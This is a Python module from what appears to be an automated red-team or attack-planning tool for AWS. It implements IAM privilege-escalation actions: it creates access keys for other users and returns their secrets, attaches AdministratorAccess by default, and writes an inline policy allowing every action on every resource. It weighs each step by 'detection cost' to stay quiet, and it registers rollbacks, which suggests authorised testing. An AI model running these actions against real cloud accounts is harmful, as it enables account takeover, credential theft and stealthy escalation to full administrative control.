"""
atlas.executor.actions.iam
~~~~~~~~~~~~~~~~~~~~~~~~~~
IAM actions: CreateAccessKey, AttachPolicy, PutInlinePolicy, ModifyTrust.

These are higher-noise actions that the planner only selects when
lower-noise alternatives (role assumption) are unavailable.
Each action registers a rollback function for cleanup.
"""

from __future__ import annotations

import json
import time
from typing import Any

from botocore.exceptions import ClientError

import structlog

from atlas.core.models import ActionResult, PlannedAction
from atlas.core.safety import RollbackEntry
from atlas.core.types import ActionStatus, Layer
from atlas.executor.base import BaseAction

logger = structlog.get_logger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# Create Access Key
# ═══════════════════════════════════════════════════════════════════════════
class CreateAccessKeyAction(BaseAction):
    """Create an access key for a target IAM user."""

    @property
    def action_type(self) -> str:
        return "create_access_key"

    @property
    def description(self) -> str:
        return "Create access key for a target IAM user."

    async def execute(self, planned: PlannedAction) -> ActionResult:
        start = time.monotonic()
        target_user_arn = planned.target_arn
        # Extract user name from ARN: arn:aws:iam::123456789012:user/username
        user_name = target_user_arn.split("/")[-1] if "/" in target_user_arn else target_user_arn

        try:
            async with self._session.client("iam") as iam:
                resp = await iam.create_access_key(UserName=user_name)

                self._recorder.record(
                    layer=Layer.EXECUTOR,
                    event_type="api_call",
                    action="iam:CreateAccessKey",
                    source_arn=planned.source_arn,
                    target_arn=target_user_arn,
                    status="success",
                    detection_cost=planned.detection_cost,
                )

                key_data = resp.get("AccessKey", {})

                return ActionResult(
                    action_id=planned.action_id,
                    status=ActionStatus.SUCCESS.value,
                    message=f"Created access key for {user_name}",
                    outputs={
                        "access_key_id": key_data.get("AccessKeyId", ""),
                        "secret_access_key": key_data.get("SecretAccessKey", ""),
                        "user_name": user_name,
                    },
                    new_discoveries=[{
                        "type": "access_key",
                        "user_arn": target_user_arn,
                        "access_key_id": key_data.get("AccessKeyId", ""),
                    }],
                    actual_detection_cost=planned.detection_cost,
                    duration_seconds=time.monotonic() - start,
                )

        except ClientError as exc:
            self._record_failure(planned, "iam:CreateAccessKey", exc)
            return self._error_result(planned, exc, start)

    def get_rollback_entry(
        self, planned: PlannedAction, result: ActionResult,
    ) -> RollbackEntry | None:
        if result.status != ActionStatus.SUCCESS.value:
            return None
        key_id = result.outputs.get("access_key_id", "")
        user_name = result.outputs.get("user_name", "")
        if not key_id or not user_name:
            return None

        async def rollback(*, access_key_id: str, user_name: str) -> None:
            async with self._session.client("iam") as iam:
                await iam.delete_access_key(
                    UserName=user_name, AccessKeyId=access_key_id,
                )

        return RollbackEntry(
            action_id=planned.action_id,
            description=f"Delete access key {key_id} from {user_name}",
            rollback_fn=rollback,
            rollback_params={"access_key_id": key_id, "user_name": user_name},
        )


# ═══════════════════════════════════════════════════════════════════════════
# Attach Managed Policy
# ═══════════════════════════════════════════════════════════════════════════
class AttachPolicyAction(BaseAction):
    """Attach a managed policy to a user or role."""

    @property
    def action_type(self) -> str:
        return "attach_policy"

    @property
    def description(self) -> str:
        return "Attach a managed policy to a user or role."

    async def execute(self, planned: PlannedAction) -> ActionResult:
        start = time.monotonic()
        target_arn = planned.target_arn
        policy_arn = planned.parameters.get(
            "policy_arn",
            "arn:aws:iam::aws:policy/AdministratorAccess",
        )
        entity_name = target_arn.split("/")[-1]
        is_role = ":role/" in target_arn

        try:
            async with self._session.client("iam") as iam:
                if is_role:
                    await iam.attach_role_policy(
                        RoleName=entity_name, PolicyArn=policy_arn,
                    )
                    api_action = "iam:AttachRolePolicy"
                else:
                    await iam.attach_user_policy(
                        UserName=entity_name, PolicyArn=policy_arn,
                    )
                    api_action = "iam:AttachUserPolicy"

                self._recorder.record(
                    layer=Layer.EXECUTOR,
                    event_type="api_call",
                    action=api_action,
                    source_arn=planned.source_arn,
                    target_arn=target_arn,
                    status="success",
                    detection_cost=planned.detection_cost,
                )

                return ActionResult(
                    action_id=planned.action_id,
                    status=ActionStatus.SUCCESS.value,
                    message=f"Attached {policy_arn} to {entity_name}",
                    outputs={
                        "policy_arn": policy_arn,
                        "entity_name": entity_name,
                        "entity_type": "role" if is_role else "user",
                    },
                    actual_detection_cost=planned.detection_cost,
                    duration_seconds=time.monotonic() - start,
                )

        except ClientError as exc:
            self._record_failure(planned, "iam:AttachPolicy", exc)
            return self._error_result(planned, exc, start)

    def get_rollback_entry(
        self, planned: PlannedAction, result: ActionResult,
    ) -> RollbackEntry | None:
        if result.status != ActionStatus.SUCCESS.value:
            return None
        policy_arn = result.outputs.get("policy_arn", "")
        entity_name = result.outputs.get("entity_name", "")
        entity_type = result.outputs.get("entity_type", "user")

        async def rollback(*, policy_arn: str, entity_name: str, entity_type: str) -> None:
            async with self._session.client("iam") as iam:
                if entity_type == "role":
                    await iam.detach_role_policy(RoleName=entity_name, PolicyArn=policy_arn)
                else:
                    await iam.detach_user_policy(UserName=entity_name, PolicyArn=policy_arn)

        return RollbackEntry(
            action_id=planned.action_id,
            description=f"Detach {policy_arn} from {entity_name}",
            rollback_fn=rollback,
            rollback_params={
                "policy_arn": policy_arn,
                "entity_name": entity_name,
                "entity_type": entity_type,
            },
        )


# ═══════════════════════════════════════════════════════════════════════════
# Put Inline Policy
# ═══════════════════════════════════════════════════════════════════════════
class PutInlinePolicyAction(BaseAction):
    """Create an inline policy on a user or role."""

    @property
    def action_type(self) -> str:
        return "put_inline_policy"

    @property
    def description(self) -> str:
        return "Create inline policy on a user or role."

    async def execute(self, planned: PlannedAction) -> ActionResult:
        start = time.monotonic()
        target_arn = planned.target_arn
        entity_name = target_arn.split("/")[-1]
        is_role = ":role/" in target_arn
        policy_name = planned.parameters.get("policy_name", "atlas-escalation")
        policy_doc = planned.parameters.get("policy_document", {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*",
            }],
        })

        try:
            async with self._session.client("iam") as iam:
                if is_role:
                    await iam.put_role_policy(
                        RoleName=entity_name,
                        PolicyName=policy_name,
                        PolicyDocument=json.dumps(policy_doc),
                    )
                    api_action = "iam:PutRolePolicy"
                else:
                    await iam.put_user_policy(
                        UserName=entity_name,
                        PolicyName=policy_name,
                        PolicyDocument=json.dumps(policy_doc),
                    )
                    api_action = "iam:PutUserPolicy"

                self._recorder.record(
                    layer=Layer.EXECUTOR,
                    event_type="api_call",
                    action=api_action,
                    source_arn=planned.source_arn,
                    target_arn=target_arn,
                    status="success",
                    detection_cost=planned.detection_cost,
                )

                return ActionResult(
                    action_id=planned.action_id,
                    status=ActionStatus.SUCCESS.value,
                    message=f"Created inline policy '{policy_name}' on {entity_name}",
                    outputs={
                        "policy_name": policy_name,
                        "entity_name": entity_name,
                        "entity_type": "role" if is_role else "user",
                    },
                    actual_detection_cost=planned.detection_cost,
                    duration_seconds=time.monotonic() - start,
                )

        except ClientError as exc:
            self._record_failure(planned, "iam:PutPolicy", exc)
            return self._error_result(planned, exc, start)

    def get_rollback_entry(
        self, planned: PlannedAction, result: ActionResult,
    ) -> RollbackEntry | None:
        if result.status != ActionStatus.SUCCESS.value:
            return None
        policy_name = result.outputs.get("policy_name", "")
        entity_name = result.outputs.get("entity_name", "")
        entity_type = result.outputs.get("entity_type", "user")

        async def rollback(*, policy_name: str, entity_name: str, entity_type: str) -> None:
            async with self._session.client("iam") as iam:
                if entity_type == "role":
                    await iam.delete_role_policy(RoleName=entity_name, PolicyName=policy_name)
                else:
                    await iam.delete_user_policy(UserName=entity_name, PolicyName=policy_name)

        return RollbackEntry(
            action_id=planned.action_id,
            description=f"Delete inline policy '{policy_name}' from {entity_name}",
            rollback_fn=rollback,
            rollback_params={
                "policy_name": policy_name,
                "entity_name": entity_name,
                "entity_type": entity_type,
            },
        )


# ═══════════════════════════════════════════════════════════════════════════
# Shared helpers
# ═══════════════════════════════════════════════════════════════════════════
def _record_failure(self: BaseAction, planned: PlannedAction, action: str, exc: ClientError) -> None:
    error_msg = exc.response.get("Error", {}).get("Message", str(exc))
    self._recorder.record(
        layer=Layer.EXECUTOR,
        event_type="api_call",
        action=action,
        source_arn=planned.source_arn,
        target_arn=planned.target_arn,
        status="failure",
        error=error_msg,
        detection_cost=planned.detection_cost,
    )


def _error_result(self: BaseAction, planned: PlannedAction, exc: ClientError, start: float) -> ActionResult:
    error_code = exc.response.get("Error", {}).get("Code", "Unknown")
    error_msg = exc.response.get("Error", {}).get("Message", str(exc))
    status = ActionStatus.PERMISSION_DENIED if error_code == "AccessDenied" else ActionStatus.FAILURE
    return ActionResult(
        action_id=planned.action_id,
        status=status.value,
        error=f"{error_code}: {error_msg}",
        actual_detection_cost=planned.detection_cost,
        duration_seconds=time.monotonic() - start,
    )


# Monkey-patch helpers onto BaseAction so subclasses can use them
BaseAction._record_failure = _record_failure  # type: ignore[attr-defined]
BaseAction._error_result = _error_result  # type: ignore[attr-defined]
